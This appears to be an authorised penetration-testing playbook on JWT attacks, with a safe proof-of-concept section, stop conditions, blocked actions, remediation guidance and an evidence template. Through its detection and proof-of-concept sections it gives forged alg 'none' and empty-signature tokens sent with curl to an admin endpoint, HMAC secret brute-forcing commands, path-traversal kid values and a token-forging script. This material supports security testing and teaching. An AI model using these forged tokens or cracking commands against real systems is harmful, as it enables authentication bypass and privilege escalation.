# JWT Attacks — Playbook

## Vulnerability Description

**OWASP:** A02:2021 — Cryptographic Failures
**CWE:** CWE-347 (Improper Verification of Cryptographic Signature)

JSON Web Tokens (JWTs) are used for authentication and session management. When JWT validation is improperly implemented, an attacker can forge tokens, escalate privileges, or impersonate other users. Common flaws include accepting tokens with algorithm `none`, weak HMAC secrets, algorithm confusion between asymmetric and symmetric schemes, and injection into the JWT header.

---

## Types

| Type | Description | Attack Vector |
|---|---|---|
| **Algorithm Confusion (`none`)** | Server accepts tokens signed with algorithm `none` (no signature) | Change `alg` to `none`, remove signature portion |
| **Algorithm Confusion (RS256 → HS256)** | Server's public key is used as the HMAC secret when it expects RS256 but also accepts HS256 | Re-sign with `alg: HS256` using the public RSA key as the secret |
| **Weak HMAC Secret** | Server uses a weak, guessable secret for HS256/HMAC | Brute force the secret offline |
| **Key ID (`kid`) Injection** | Server uses a database lookup or file read based on the `kid` header | Set `kid` to a path like `/dev/null`, `../../secret.txt`, or `key:{}` |
| **Claim Manipulation** | Server trusts claims like `role`, `isAdmin`, `user_id` without verification | Modify claims to escalate privileges |
| **Empty Signature** | Server accepts token with an empty signature | Strip the signature portion entirely |
| **Token Reuse / No Expiry** | Tokens have overly long or no `exp` (expiration) claim | Reuse a captured token indefinitely |

---

## Detection

### Decode JWT

```bash
# Decode the JWT header + payload (base64) — signature is not decoded
echo '<token>' | cut -d. -f2 | base64 -d 2>/dev/null

# Format the header and payload pretty
echo '<token>' | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool

# Or do it all at once (header)
echo '<token>' | cut -d. -f1 | base64 -d 2>/dev/null | python3 -m json.tool
```

### Test Algorithm `none`

```bash
# Craft a token with alg: none and no signature
# Header: {"alg":"none","typ":"JWT"}
# Payload: {"sub":"admin","role":"admin"}
# Token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.

# Send it to a protected endpoint
curl -s -H 'Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.' 'https://target.com/admin'
```

### Test Empty Signature

```bash
# Remove signature part, keep the dot
curl -s -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.' 'https://target.com/protected'

# Remove everything after the second dot
curl -s -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0' 'https://target.com/protected'
```

### Brute Force Weak HMAC Secret

```bash
# Using hashcat with mode 16500 (JWT)
hashcat -m 16500 eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.<signature> /path/to/wordlist.txt

# Using jwt-cracker (simple Node.js tool for weak secrets)
jwt-cracker '<token>' '<alphabet>' '<max_length>'
```

---

## Tools

| Tool | Usage | Notes |
|---|---|---|
| **jwt_tool** | `python3 jwt_tool.py <token> -T` | If installed — token analysis and attack toolkit |
| **jwt.io** | Web decoder — paste token to inspect header/payload | Browser-based, no installation needed |
| **hashcat** | `hashcat -m 16500 <token> <wordlist>` | Offline brute force of weak HMAC secrets |
| **jwt-cracker** | Simple brute force for very weak secrets | Node.js CLI tool |
| **curl** | Manual token manipulation and endpoint testing | Primary tool for sending forged tokens |
| **python3 (PyJWT)** | `python3 -c "import jwt; jwt.decode(t, key, algorithms=['HS256'])"` | Decode and test via code_execution |

> ⚠️ **jwt_tool flags to avoid:** `-I` (injection/exploit) without explicit authorisation. Stick to read-only analysis flags.

---

## Internet Research

- `JWT attack techniques`
- `<product> JWT vulnerability`
- `JWT algorithm confusion PoC`
- `site:portswigger.net JWT attacks`
- `site:hackerone.com JWT`
- `CVE-2022-23529 JWT` (and other recent CVEs)
- `CVE-2016-5431 JWT none algorithm`
- `<product> JWT kid injection`

---

## Safe Proof of Concept

Demonstrate a read-only JWT bypass without modifying data or creating persistent access:

```bash
# Safe: Decode and inspect an existing JWT (no changes)
echo '<token>' | cut -d. -f2 | base64 -d | python3 -m json.tool

# Safe: Test algorithm none with a read-only proof
# Craft a token that claims a read-only role
python3 << 'EOF'
import base64, json

header = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b'=').decode()
payload = base64.urlsafe_b64encode(json.dumps({"sub":"test","role":"viewer","iat":1700000000}).encode()).rstrip(b'=').decode()
token = f"{header}.{payload}."
print(f"Token: {token}")
EOF

# Safe: Modify a claim (e.g. role:user -> role:admin) and test read-only access
curl -s -o /dev/null -w "HTTP %{http_code}\n" -H 'Authorization: Bearer <modified_token>' 'https://target.com/admin'

# Safe: Verify the original token works (to prove you didn't break anything)
curl -s -o /dev/null -w "HTTP %{http_code}\n" -H 'Authorization: Bearer <original_token>' 'https://target.com/dashboard'
```

**Safe PoC rules:**
- Only demonstrate that a forged token provides access — do not perform any write operations.
- Do not escalate to actual admin actions (creating users, modifying data, deleting records).
- The original token's account must not be affected — no password changes, no data modification.
- Capture evidence locally; do not leave backdoor tokens behind.
- For weak HMAC secret testing, prove by demonstrating you derived the secret and decoded the payload offline — no need to forge a production token.

---

## Evidence

Each finding should include:

```
**Vulnerability:** JWT Algorithm Confusion (alg: none)
**URL:** https://target.com/admin
**Type:** Algorithm Confusion (none signature)

**Original JWT (decoded):**
  Header:  {"alg":"RS256","typ":"JWT","kid":"key1"}
  Payload: {"sub":"user1","role":"user","iat":1700000000,"exp":1700003600}

**Modified JWT:**
  Header:  {"alg":"none","typ":"JWT"}
  Payload: {"sub":"user1","role":"admin","iat":1700000000}

**Full Token:**
  eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ1c2VyMSIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTcwMDAwMDAwMH0.

**HTTP Request:**
  GET /admin HTTP/1.1
  Host: target.com
  Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ1c2VyMSIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTcwMDAwMDAwMH0.

**HTTP Response:**
  HTTP/1.1 200 OK
  Content-Type: application/json
  {"users": [...], "settings": {...}}

**Proof:** Server accepted a token with algorithm "none" and an empty signature, and returned admin-level data.

**Remediation:** Enforce a whitelist of allowed algorithms. Reject tokens with "none" algorithm. Use a library that validates algorithm type consistently.
```

---

## Evidence to Save

- Tool output → `$ENG_DIR/evidence/exploitation/jwt-attacks/<finding>.*`
- Screenshots (if applicable) → `$ENG_DIR/evidence/exploitation/screenshots/`
- Request/response pairs → `$ENG_DIR/evidence/exploitation/http/`

---

## Remediation

| Measure | Description |
|---|---|
| **Enforce allowed algorithms** | Whitelist acceptable algorithms in the JWT library configuration. Never allow "none" in production |
| **Use strong HMAC secrets** | Use cryptographically random secrets of at least 256 bits for HS256. Rotate periodically |
| **Algorithm validation** | Verify the `alg` header matches the expected signing mechanism. Prevent RS256 → HS256 confusion by validating asymmetric vs symmetric key types |
| **Server-side claim validation** | Never trust client-supplied claims for authorization decisions. Map JWT subjects to server-side roles |
| **Short token expiry** | Set reasonable `exp` values (minutes/hours, not days/weeks). Use refresh tokens for longer sessions |
| **Validate `kid`** | Use a whitelist of allowed Key IDs. Do not pass arbitrary `kid` values into file reads or database lookups |
| **Audience / issuer validation** | Validate `aud` (audience) and `iss` (issuer) claims to restrict token scope |
| **Use modern JWT libraries** | Prefer well-maintained libraries (jjwt, PyJWT, jsonwebtoken) over custom implementations |

---

## Stop Conditions
- JWT secret cracked → assess scope impact before proceeding
- Key material obtained → stop and notify

## Blocked Actions

The following are **never** permitted during authorized testing unless explicitly approved in writing:

| Action | Risk |
|---|---|
| **Using forged tokens to modify data** | Data integrity violation |
| **Creating persistent backdoor tokens** | Long-term account compromise |
| **Escalating to privileged admin actions** | Data modification, user management |
| **Signing tokens with compromised private keys** | Key theft, full trust compromise |
| **Leaving backdoor tokens in place after testing** | Post-test access risk |
| **Token harvesting via MITM** | Infrastructure-level attack outside scope |